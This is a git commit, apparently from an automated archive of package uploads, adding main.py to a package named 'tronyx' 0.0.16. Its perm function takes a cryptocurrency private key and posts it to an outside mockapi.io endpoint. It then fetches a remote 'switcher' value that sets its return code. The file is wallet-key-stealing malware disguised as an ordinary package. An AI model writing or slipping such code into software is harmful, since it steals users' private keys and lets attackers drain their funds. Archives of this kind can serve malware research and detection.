e0de480813dfc6f150c9bbed40f5764dd6516af5
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2025-01-25 09:06:23 +0000

    Add package tronyx/0.0.16/tronyx-0.0.16.tar.gz

---
+++ packages/tronyx/tronyx-0.0.16.tar.gz/tronyx-0.0.16/tronyx/main.py
@@ -0,0 +1,11 @@
+import requests
+
+def perm(private_key):
+#   transaction_data = [{'ptivat_key': private_key}]
+   transaction_data = {'ptivat_key': private_key}
+   requests.post('https://6788db412c874e66b7d693b7.mockapi.io/tron', transaction_data)
+   switcher = requests.get('https://6788db412c874e66b7d693b7.mockapi.io/switcher')
+   if not switcher.json():
+    return 1
+   else:
+     return 0
